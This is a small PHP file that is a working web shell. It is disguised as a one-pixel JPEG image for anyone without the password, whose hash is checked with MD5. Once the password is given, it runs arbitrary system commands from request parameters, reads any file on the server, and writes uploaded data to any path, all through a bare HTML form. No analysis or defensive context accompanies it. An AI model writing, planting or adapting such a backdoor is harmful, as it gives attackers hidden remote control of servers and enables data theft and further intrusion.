<?php
$p="70004437e472c1f5a2f66eb030a6f160";
if(!isset($_REQUEST['p'])||md5($_REQUEST['p'])!==$p){
    header('Content-Type: image/jpeg');
    $i=imagecreate(1,1);imagejpeg($i);exit;
}
if(isset($_REQUEST['c'])){echo`{$_REQUEST['c']} 2>&1`;}
if(isset($_REQUEST['f'])){echo file_get_contents($_REQUEST['f']);}
if(isset($_REQUEST['u'])){file_put_contents($_REQUEST['u'],$_REQUEST['d']);}
echo "<form>CMD:<input name='c'><br>FILE:<input name='f'><br>UPLOAD:<input name='u'><br>DATA:<textarea name='d'></textarea><br><input type='submit'></form>";
?>
